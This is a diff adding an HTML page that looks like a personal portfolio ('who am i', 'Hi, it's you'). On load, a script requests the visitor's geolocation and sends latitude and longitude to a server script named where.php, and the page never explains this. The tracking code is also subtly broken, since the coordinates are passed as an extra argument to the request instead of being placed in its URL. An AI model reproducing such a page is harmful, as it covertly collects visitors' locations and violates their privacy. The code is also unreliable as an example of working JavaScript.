@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+    <title>Document</title>
+</head>
+<body onload="getLocation()">
+
+<p id="demo"></p>
+
+<script>
+const x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("GET", "where.php?lat=", position.coords.latitude + "&long=" + position.coords.longitude);
+    xhttp.send();
+}
+</script>
+    <header class="header header">
+        <a href="#home" class="logo">who
+        <span>am i</span></a>
+
+        <i class='bx bx-menu' id="menu-icon"></i>
+            <nav class="navbar">
+                <a href="#home" class="active">Home</a>
+                <a href="#education">Education</a>
+                <a href="#services">Services</a>
+                <a href="#comntact">Contact</a>
+                <a href=""></a>
+            </nav>
+    </header>
+
+    <section class="home" id="home">
+        <div class="home-content">
+            <h1>Hi, it's <span>you</span></h1>
+            <h3 class="text-animation"> <span></span></h3>
+            <div class="social-icons">
+                 <a href="#"><i class="fa-brands fa-github"></i></a>
+                 <a href="#"><i class="fa-brands fa-facebook"></i></a>
+                 <a href="#"><i class="fa-brands fa-instagram"></i></a>
+                 <a href="#"><i class="fa-brands fa-discord"></i></a>
+            </div>
+
+            <div class="btn-group">
+                <a href="#" class="btn">Hier</a>
+                <a href="#contact" class="btn">Contact</a>
+            </div>
+        </div>
+    </section>
+    <script src="script.js"></script>
+</body>
+</html>
